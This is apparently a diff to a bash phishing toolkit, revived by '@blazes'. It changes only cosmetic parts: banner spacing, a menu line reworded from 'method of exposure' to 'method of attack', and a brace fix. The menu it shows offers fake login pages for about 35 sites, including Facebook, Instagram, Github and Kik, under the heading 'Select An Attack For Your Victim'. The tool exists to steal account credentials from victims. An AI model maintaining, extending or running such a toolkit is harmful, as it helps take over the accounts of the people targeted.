@@ -142,7 +142,7 @@ banner() {
 		${MAGENTA}▐         █    ▐   █             █          █   █    █       █ ▐       █   █     █    ▐   █     ▐   
 		${MAGENTA}          ▐        ▐             ▐          ▐   ▐    ▐       ▐         ▐   ▐     ▐        ▐                       
 		${MAGENTA}                                                             
-	                    ${CYAN}Cha-Cha Real Smooth~~~~                                          ${RED}Ver : 0.1-beta
+	        ${CYAN}Cha-Cha Real Smooth~~~~                                                      ${RED}Ver : 0.1-beta
 
 		${RED}~~~~~${GREEN}ReviveD by @blazes w/Zero LMAO. ${CYAN}ILuvYall<3${GREEN}(More to come? kik.me/blazes)${RED}~~~~~
 		
@@ -503,7 +503,7 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select your method of exposure. ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Select your method of attack. ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
@@ -517,12 +517,12 @@ main_menu() {
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		
-		#{MAGENTA~~~${GREEN}KIK STUFF FOR NOW${MAGENTA}~~~
+		#{MAGENTA}~~~${GREEN}KIK STUFF FOR NOW${MAGENTA}~~~
 		
 		${RED}[${WHITE}34${RED}]${ORANGE} Rage Unbrick
 		${RED}[${WHITE}35${RED}]${ORANGE} Kik.com/login
 
-        ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+                ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
